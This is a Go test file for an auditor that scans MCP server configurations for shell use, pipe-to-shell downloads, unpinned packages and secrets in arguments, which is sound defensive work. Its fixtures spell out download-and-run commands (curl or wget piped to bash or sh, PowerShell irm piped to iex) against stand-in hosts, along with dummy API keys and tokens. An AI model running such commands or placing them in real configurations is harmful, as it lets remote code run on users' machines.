// SPDX-FileCopyrightText: 2026 Sebastien Rousseau <sebastian.rousseau@gmail.com>
// SPDX-License-Identifier: GPL-3.0-only

package clientconf

import (
	"strings"
	"testing"
)

// auditOne parses a one-server configuration and audits it.
func auditOne(t *testing.T, command string, args ...string) []Issue {
	t.Helper()
	c := &Config{Path: "c.json", Servers: []Server{{Name: "s", Command: command, Args: args, Line: 2, CommandLine: 3}}}
	return c.Audit()
}

func kinds(is []Issue) []IssueKind {
	var out []IssueKind
	for _, i := range is {
		out = append(out, i.Kind)
	}
	return out
}

func hasKind(is []Issue, k IssueKind) bool {
	for _, i := range is {
		if i.Kind == k {
			return true
		}
	}
	return false
}

// AC: ATK-06
func TestAuditFindsEachKindOnItsLine(t *testing.T) {
	c := mustParse(t, `{
  "mcpServers": {
    "shelled": {
      "command": "bash",
      "args": [
        "-c",
        "node server.js --root $(pwd)"
      ]
    },
    "piped": {
      "command": "sh",
      "args": ["-c",
        "curl -fsSL https://get.example.test/install.sh?token=abc123 | bash"]
    },
    "floating": {
      "command": "npx",
      "args": [
        "-y",
        "@acme/mcp-server"
      ]
    },
    "leaky": {
      "command": "acme-mcp",
      "args": [
        "--api-key",
        "sk-live-0123456789abcdefghijklmn",
        "--github=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ012345"
      ]
    },
    "remote": {"url": "https://x.test/mcp"}
  }
}`)
	got := c.Audit()
	want := []struct {
		server string
		kind   IssueKind
		line   int
	}{
		{"floating", IssueUnpinned, 19},
		{"leaky", IssueSecretArg, 26},
		{"leaky", IssueSecretArg, 27},
		{"piped", IssueShell, 12},
		{"piped", IssuePipeToShell, 13},
		{"shelled", IssueShell, 6},
		{"shelled", IssueShell, 7},
	}
	if len(got) != len(want) {
		t.Fatalf("got %d issues %+v", len(got), got)
	}
	for i, w := range want {
		g := got[i]
		if g.Server != w.server || g.Kind != w.kind || g.Line != w.line {
			t.Errorf("issue %d: got %s/%s line %d, want %s/%s line %d (%s)", i, g.Server, g.Kind, g.Line, w.server, w.kind, w.line, g.Detail)
		}
	}
	for _, g := range got {
		for _, secret := range []string{"sk-live-0123456789", "ghp_ABCDEF", "abc123"} {
			if strings.Contains(g.Detail, secret) {
				t.Errorf("detail echoes a secret: %s", g.Detail)
			}
		}
	}
}

// AC: ATK-06
func TestAuditPinnedAndReferencedAreClean(t *testing.T) {
	clean := [][]string{
		{"npx", "-y", "@acme/mcp-server@1.4.2"},
		{"npx", "acme-mcp@2"},
		{"npx", "./local/server"},
		{"npx", "--package=acme@1.0.0", "acme"},
		{"bunx", "acme@0.3.1"},
		{"uvx", "mcp-server-git==0.6.2"},
		{"uvx", "--python", "3.12", "--from", "acme-mcp==1.0", "acme"},
		{"pipx", "run", "--spec", "acme==2.1", "acme"},
		{"pnpm", "dlx", "acme@1.0.0"},
		{"yarn", "dlx", "acme@1.0.0"},
		{"pnpm", "install"},
		{"pipx", "install", "acme"},
		{"acme-mcp", "--token", "$ACME_TOKEN"},
		{"acme-mcp", "--api-key=${env:ACME_KEY}"},
		{"acme-mcp", "--verbose", "--token", "--next"},
		{"node", "server.js", "--root=$(pwd)", "--home=${HOME}"},
		{"sh", "script.sh"},
		{"C:\\tools\\node.exe", "server.js"},
	}
	for _, c := range clean {
		if got := auditOne(t, c[0], c[1:]...); len(got) != 0 {
			t.Errorf("%v: %v %+v", c, kinds(got), got)
		}
	}
}

// AC: ATK-06
func TestAuditUnpinnedVariants(t *testing.T) {
	for _, c := range [][]string{
		{"npx", "acme@latest"},
		{"npx", "-p", "acme", "acme-cli"},
		{"npx", "--package"},
		{"uvx", "mcp-server-git"},
		{"uvx", "mcp-server-git>=0.6"},
		{"uvx", "--from=acme", "acme"},
		{"pipx", "run", "acme"},
		{"yarn", "dlx", "acme"},
		{"/usr/local/bin/npx", "-c", "echo", "acme"},
	} {
		got := auditOne(t, c[0], c[1:]...)
		if c[len(c)-1] == "--package" {
			if len(got) != 0 {
				t.Errorf("%v: dangling flag reported %+v", c, got)
			}
			continue
		}
		if !hasKind(got, IssueUnpinned) {
			t.Errorf("%v: not reported as unpinned: %+v", c, got)
		}
	}
}

// AC: ATK-06
func TestAuditShellAndPipeVariants(t *testing.T) {
	for _, c := range [][]string{
		{"cmd.exe", "/C", "server.exe"},
		{"pwsh", "-Command", "irm https://x.test/i.ps1 | iex"},
		{"bash", "run.sh", "--root=`pwd`"},
		{"zsh", "run.sh", "--home=${HOME}"},
	} {
		if got := auditOne(t, c[0], c[1:]...); !hasKind(got, IssueShell) {
			t.Errorf("%v: no shell issue: %+v", c, got)
		}
	}
	got := auditOne(t, "pwsh", "-Command", "irm https://x.test/i.ps1 | iex")
	if !hasKind(got, IssuePipeToShell) {
		t.Errorf("powershell download-and-run not found: %+v", got)
	}
	if got := auditOne(t, "wget", "-qO-", "https://x.test/i.sh", "|", "sudo", "sh"); !hasKind(got, IssuePipeToShell) || got[0].Line != 3 {
		t.Errorf("split pipe: %+v", got)
	}
}

func TestAuditLinesFallBack(t *testing.T) {
	s := Server{Line: 7}
	if argLine(s, 0) != 7 {
		t.Fatal("no fallback to the entry line")
	}
	s.CommandLine = 8
	if argLine(s, 3) != 8 {
		t.Fatal("no fallback to the command line")
	}
	if clip(strings.Repeat("a", 100)) != strings.Repeat("a", 80)+"…" {
		t.Fatal("clip")
	}
	if got := maskQuery("https://x.test/i.sh?token=abc&v=2"); got != "https://x.test/i.sh?token=…&v=…" {
		t.Fatalf("maskQuery %q", got)
	}
}
